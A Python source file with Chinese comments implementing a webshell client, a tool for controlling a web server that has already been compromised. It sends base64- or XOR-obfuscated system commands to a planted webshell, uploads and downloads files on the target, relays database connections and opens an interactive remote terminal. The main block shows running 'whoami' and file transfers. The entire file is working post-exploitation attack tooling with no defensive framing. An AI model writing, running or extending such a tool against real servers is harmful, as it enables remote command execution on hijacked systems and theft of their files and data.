import base64
import json
import os
import urllib.parse
import urllib.request
from argparse import ArgumentParser

try:
    import pymysql
except ImportError:
    pymysql = None


class WebshellManager:
    def __init__(self, url, password, encrypt_type='base64', timeout=10):
        """
        :param url: Webshell连接地址
        :param password: 连接密码
        :param encrypt_type: 加密类型 (base64/xor)
        :param timeout: 请求超时时间
        """
        self.url = url
        self.password = password
        self.encrypt_type = encrypt_type
        self.timeout = timeout
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

    def _encrypt(self, data):
        """数据加密方法"""
        if self.encrypt_type == 'base64':
            return base64.b64encode(data.encode()).decode()
        elif self.encrypt_type == 'xor':
            return ''.join(chr(ord(c) ^ 0xFF) for c in data)
        return data

    def _decrypt(self, data):
        """数据解密方法"""
        if self.encrypt_type == 'base64':
            return base64.b64decode(data).decode()
        elif self.encrypt_type == 'xor':
            return ''.join(chr(ord(c) ^ 0xFF) for c in data)
        return data

    def execute(self, command):
        """执行系统命令"""
        payload = {
            'pass': self.password,
            'cmd': self._encrypt(command)
        }

        try:
            data = urllib.parse.urlencode(payload).encode()
            req = urllib.request.Request(
                self.url,
                data=data,
                headers=self.headers
            )
            with urllib.request.urlopen(req, timeout=self.timeout) as res:
                response = res.read().decode()
                return self._decrypt(response)
        except Exception as e:
            return f"Error: {str(e)}"

    def upload(self, local_path, remote_path):
        """上传文件到目标服务器"""
        if not os.path.exists(local_path):
            return "Local file not exists"

        with open(local_path, 'rb') as f:
            file_content = base64.b64encode(f.read()).decode()

        payload = {
            'pass': self.password,
            'action': 'upload',
            'path': remote_path,
            'data': file_content
        }

        return self._send_special(payload)

    def download(self, remote_path, local_path):
        """下载远程文件到本地"""
        payload = {
            'pass': self.password,
            'action': 'download',
            'path': remote_path
        }

        response = self._send_special(payload)
        if response.startswith('ERROR:'):
            return response

        try:
            with open(local_path, 'wb') as f:
                f.write(base64.b64decode(response))
            return "Download success"
        except Exception as e:
            return f"Download failed: {str(e)}"

    def _send_special(self, payload):
        """发送特殊操作请求"""
        try:
            data = urllib.parse.urlencode(payload).encode()
            req = urllib.request.Request(
                self.url,
                data=data,
                headers=self.headers
            )
            with urllib.request.urlopen(req, timeout=self.timeout) as res:
                return res.read().decode()
        except Exception as e:
            return f"Error: {str(e)}"

    def db_connect(self, db_config):
        """连接数据库（需要目标服务器支持数据库扩展）"""
        if not pymysql:
            return "pymysql module required"

        payload = {
            'pass': self.password,
            'action': 'db_connect',
            'config': json.dumps(db_config)
        }

        return self._send_special(payload)

    def virtual_terminal(self):
        """进入虚拟终端模式"""
        print("Entering virtual terminal (type 'exit' to quit)")
        while True:
            cmd = input("webshell > ")
            if cmd.lower() == 'exit':
                break
            print(self.execute(cmd))


if __name__ == '__main__':
    parser = ArgumentParser(description='Webshell Management Tool')
    parser.add_argument('-u', '--url', required=True, help='Webshell URL')
    parser.add_argument('-p', '--password', required=True, help='Connection password')
    args = parser.parse_args()

    manager = WebshellManager(args.url, args.password)

    # 示例使用
    print(manager.execute('whoami'))
    manager.upload('/path/to/local.txt', '/path/to/remote.txt')
    manager.download('/path/to/remote.txt', '/path/to/local.txt')
    manager.virtual_terminal()